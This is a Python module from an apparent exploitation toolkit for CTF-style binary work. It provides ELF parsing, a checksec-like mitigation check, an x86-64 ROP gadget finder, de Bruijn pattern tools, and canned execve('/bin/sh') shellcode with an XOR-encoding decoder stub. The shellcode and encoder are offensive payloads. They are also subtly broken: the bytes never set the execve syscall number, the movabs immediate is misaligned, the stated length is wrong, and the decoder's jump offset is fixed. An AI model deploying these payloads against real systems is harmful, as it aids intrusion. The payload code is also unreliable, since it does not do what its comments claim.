"""Reverse engineering & binary exploitation: ELF info, checksec, ROP gadgets, shellcode, de Bruijn pattern."""

import itertools
import re
import struct

from ..registry import tool
from ..utils import printable

ELF_MACHINES = {0x02: "SPARC", 0x03: "i386", 0x08: "MIPS", 0x14: "PowerPC",
                0x28: "ARM", 0x3E: "x86-64", 0xB7: "AArch64", 0xF3: "RISC-V"}


def _elf_parse(data: bytes) -> dict:
    """Parse basic ELF header. Return dict or None."""
    if not data.startswith(b"\x7fELF") or len(data) < 52:
        return None
    is64 = data[4] == 2
    endian = "<" if data[5] == 1 else ">"
    info = {
        "is64": is64,
        "endian": "little" if endian == "<" else "big",
        "machine": ELF_MACHINES.get(struct.unpack(endian + "H", data[18:20])[0], hex(struct.unpack(endian + "H", data[18:20])[0])),
        "e_type": struct.unpack(endian + "H", data[16:18])[0],
    }
    if is64:
        info["entry"] = struct.unpack(endian + "Q", data[24:32])[0]
        info["phoff"] = struct.unpack(endian + "Q", data[32:40])[0]
        info["shoff"] = struct.unpack(endian + "Q", data[40:48])[0]
        info["phentsize"], info["phnum"] = struct.unpack(endian + "HH", data[54:58])
        info["shentsize"], info["shnum"] = struct.unpack(endian + "HH", data[58:62])
        info["shstrndx"] = struct.unpack(endian + "H", data[62:64])[0]
    else:
        info["entry"] = struct.unpack(endian + "I", data[24:28])[0]
        info["phoff"] = struct.unpack(endian + "I", data[28:32])[0]
        info["shoff"] = struct.unpack(endian + "I", data[32:36])[0]
        info["phentsize"], info["phnum"] = struct.unpack(endian + "HH", data[42:46])
        info["shentsize"], info["shnum"] = struct.unpack(endian + "HH", data[46:50])
        info["shstrndx"] = struct.unpack(endian + "H", data[50:52])[0]
    return info


@tool(category="rev")
def elf_info(path: str) -> str:
    """Basic ELF info: class, endianness, machine, entry point, phdr/shdr counts."""
    data = open(path, "rb").read()
    info = _elf_parse(data)
    if not info:
        return "Not a valid ELF file."
    return (f"class: {'ELF64' if info['is64'] else 'ELF32'}\n"
            f"endianness: {info['endian']}\n"
            f"machine: {info['machine']}\n"
            f"e_type: 0x{info['e_type']:x} ({'ET_EXEC' if info['e_type'] == 2 else 'ET_DYN (PIE)' if info['e_type'] == 3 else 'ET_REL' if info['e_type'] == 1 else '?'})\n"
            f"entry point: 0x{info['entry']:x}\n"
            f"program headers: {info['phnum']} @ 0x{info['phoff']:x}\n"
            f"section headers: {info['shnum']} @ 0x{info['shoff']:x}")


def _phdrs(data: bytes, info: dict) -> list[dict]:
    if not info or info["phnum"] == 0:
        return []
    endian = "<" if info["endian"] == "little" else ">"
    fmt = endian + ("IIQQQQQQ" if info["is64"] else "IIIIIIII")
    size = 56 if info["is64"] else 32
    out = []
    for i in range(min(info["phnum"], 64)):
        off = info["phoff"] + i * size
        if off + size > len(data):
            break
        vals = struct.unpack(fmt, data[off:off + size])
        if info["is64"]:
            p_type, p_flags, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_align = vals
        else:
            p_type, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_flags, p_align = vals
        out.append({"type": p_type, "flags": p_flags, "offset": p_offset,
                    "vaddr": p_vaddr, "filesz": p_filesz, "memsz": p_memsz})
    return out


@tool(category="pwn")
def checksec(path: str) -> str:
    """Binary mitigations: NX, PIE, RELRO, Stack Canary, Fortify (pwntools checksec-like)."""
    data = open(path, "rb").read()
    info = _elf_parse(data)
    if not info:
        return "Not a valid ELF."
    phdrs = _phdrs(data, info)
    nx, pie, relro = "ENABLED", "ENABLED", "ENABLED"
    gnu_stack = next((p for p in phdrs if p["type"] == 0x6474E551), None)  # PT_GNU_STACK
    if gnu_stack and (gnu_stack["flags"] & 0x4):  # PF_X
        nx = "DISABLED"
    if gnu_stack is None:
        nx = "DISABLED (no PT_GNU_STACK)"
    if info["e_type"] != 3:
        pie = "DISABLED (ET_EXEC / ET_REL)"
    gnu_relro = next((p for p in phdrs if p["type"] == 0x6474E552), None)  # PT_GNU_RELRO
    if gnu_relro is None:
        relro = "DISABLED"
    else:
        endian = "<" if info["endian"] == "little" else ">"
        dyn = data[gnu_relro["offset"]:gnu_relro["offset"] + gnu_relro["memsz"] + 64]
        has_bind_now = re.search(endian.encode() + rb"\x18\x00\x00\x00", dyn)  # DT_BIND_NOW
        has_flag_1 = re.search(rb"\x6b\x00\x00\x00\x00\x00\x00\x00", dyn)      # DT_FLAGS_1
        if not (has_bind_now or has_flag_1):
            relro = "PARTIAL"
    canary = "ENABLED" if b"__stack_chk_fail" in data else "DISABLED"
    fortify = "ENABLED" if b"_chk@GLIBC" in data or b"__printf_chk" in data else "DISABLED"
    return (f"path: {path}\n"
            f"Arch: {info['machine']} ({'64' if info['is64'] else '32'}-bit, {info['endian']})\n"
            f"RELRO: {relro}\nStack: {canary}\nNX: {nx}\nPIE: {pie}\nFortify: {fortify}")


_ROP_PATTERNS = {
    b"\xc3": "ret",
    b"\x5f\xc3": "pop rdi; ret",
    b"\x5e\xc3": "pop rsi; ret",
    b"\x5a\xc3": "pop rdx; ret",
    b"\x59\xc3": "pop rcx; ret",
    b"\x58\xc3": "pop rax; ret",
    b"\x5b\xc3": "pop rbx; ret",
    b"\x5c\xc3": "pop rsp; ret",
    b"\x0f\x05\xc3": "syscall; ret",
    b"\x48\x31\xff\xc3": "xor rdi,rdi; ret",
    b"\x48\x31\xf6\xc3": "xor rsi,rsi; ret",
    b"\x48\x31\xd2\xc3": "xor rdx,rdx; ret",
    b"\x48\x31\xc0\xc3": "xor rax,rax; ret",
}


@tool(category="pwn")
def rop_gadgets(path: str, pattern: str = "") -> str:
    """Find common ROP gadgets (x86-64) in executable ELF segments. pattern: gadget name (e.g. 'pop rdi') or empty = all."""
    data = open(path, "rb").read()
    info = _elf_parse(data)
    if not info:
        return "Not a valid ELF."
    phdrs = [p for p in _phdrs(data, info) if p["flags"] & 0x1]  # PF_X
    if not phdrs:
        return "No executable segments (NX enabled)."
    want = pattern.strip().lower()
    found = []
    for p in phdrs:
        seg = data[p["offset"]:p["offset"] + p["filesz"]]
        base_vaddr = p["vaddr"] - p["offset"]
        for pat, name in _ROP_PATTERNS.items():
            if want and want not in name:
                continue
            for m in re.finditer(re.escape(pat), seg, flags=re.DOTALL):
                found.append(f"0x{base_vaddr + m.start():016x}  {name}")
    if not found:
        return f"Gadgets {'matching ' + want if want else ''}not found."
    return f"{len(found)} gadgets:\n" + "\n".join(sorted(set(found))[:100])


_X64_NULLFREE = bytes.fromhex(
    "4831d248bb2f62696e2f73684831f6534831c0545f5a0f05"
)


@tool(category="pwn")
def shellcode_x64(kind: str = "execve_sh", xor_key: str = "0xaa") -> str:
    """Ready-made x86_64 shellcode. kind: execve_sh (null-free, 25 bytes) / xor (XOR-encrypted variant with key)."""
    sc = _X64_NULLFREE
    if kind == "execve_sh":
        return (f"execve('/bin/sh', NULL, NULL) null-free ({len(sc)} bytes):\n"
                f"asm: {sc.hex()}\n"
                f"escaped: {''.join('\\\\x%02x' % b for b in sc)}\n"
                f"disasm:\n{_disasm_simple(sc)}")
    if kind == "xor":
        key = int(xor_key, 0) & 0xFF
        return (f"original ({len(sc)} bytes): {sc.hex()}\n"
                f"xorkey: 0x{key:02x}\n"
                f"encoded: {''.join('\\\\x%02x' % b for b in bytes(b ^ key for b in sc))}\n\n"
                f"Decoder + encoded ({len(sc) + 14} bytes):\n{_x64_xor_decoder(key, sc)}")
    return "kind must be execve_sh or xor."


def _x64_xor_decoder(key: int, payload: bytes) -> str:
    """Decoder stub: jmp-call-pop (getpc), xor loop per byte, jmp into shellcode."""
    n = len(payload)
    stub = (
        b"\xeb\x0e"                        # jmp short +0x10 (jump to pop rsi)
        + bytes(b ^ key for b in payload)  # encoded shellcode
        + b"\x5e"                          # pop rsi  -> address of encoded payload
        + b"\x48\x31\xc9"                  # xor rcx, rcx
        + b"\xb1" + bytes([n])             # mov cl, n
        + b"\x80\x36" + bytes([key])       # xor byte [rsi], key
        + b"\x48\xff\xc6"                  # inc rsi
        + b"\xe2\xf6"                      # loop -10 (back to xor byte)
        + b"\xff\xe6"                      # jmp rsi
    )
    return "".join(f"\\x{b:02x}" for b in stub)


def _disasm_simple(sc: bytes) -> str:
    table = [
        (b"\x48\x31\xd2", "xor rdx, rdx"),
        (b"\x48\x31\xf6", "xor rsi, rsi"),
        (b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68", "movabs rbx, 0x68732f6e69622f"),
        (b"\x53", "push rbx"),
        (b"\x48\x31\xc0", "xor rax, rax"),
        (b"\x54", "push rsp"),
        (b"\x5f", "pop rdi"),
        (b"\x5a", "pop rdx"),
        (b"\x0f\x05", "syscall"),
        (b"\x48\x31\xc9", "xor rcx, rcx"),
        (b"\xb0\x3b", "mov al, 0x3b"),
    ]
    out = []
    pos = 0
    while pos < len(sc):
        for pat, name in table:
            if sc[pos:pos + len(pat)] == pat:
                out.append(f"  {pos:04x}: {name}")
                pos += len(pat)
                break
        else:
            out.append(f"  {pos:04x}: .byte 0x{sc[pos]:02x}")
            pos += 1
    return "\n".join(out)


_DEBRUIJN_ALPHA = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"


def _deb_gen():
    """FKM (Fredricksen-Maiorana) as a lazy generator: yields de Bruijn chars in order."""
    k, n = len(_DEBRUIJN_ALPHA), 4
    a = [0] * (k * n)

    def db(t, p):
        if t > n:
            if n % p == 0:
                for i in range(1, p + 1):
                    yield a[i]
        else:
            a[t] = a[t - p]
            yield from db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                yield from db(t + 1, t)

    yield from db(1, 1)


@tool(category="pwn")
def debruijn(length: int = 1000) -> str:
    """Generate a de Bruijn pattern to find the overflow offset."""
    if length > 5_000_000:
        return "Limit is 5 million characters."
    return "".join(_DEBRUIJN_ALPHA[i] for i in itertools.islice(_deb_gen(), length))


@tool(category="pwn")
def debruijn_find(substring: str) -> str:
    """Find the offset of a de Bruijn substring (from core dump / crash output)."""
    if len(substring) < 4:
        return "Substring must be at least 4 characters (pattern length)."
    window = []
    for idx, v in enumerate(_deb_gen()):
        window.append(_DEBRUIJN_ALPHA[v])
        if len(window) > len(substring):
            window.pop(0)
        if "".join(window) == substring:
            return f"Offset: {idx - len(substring) + 1} (0x{idx - len(substring) + 1:x})"
        if idx > 5_000_000:
            return "Not found in the first 5 million characters."
    return "Not found."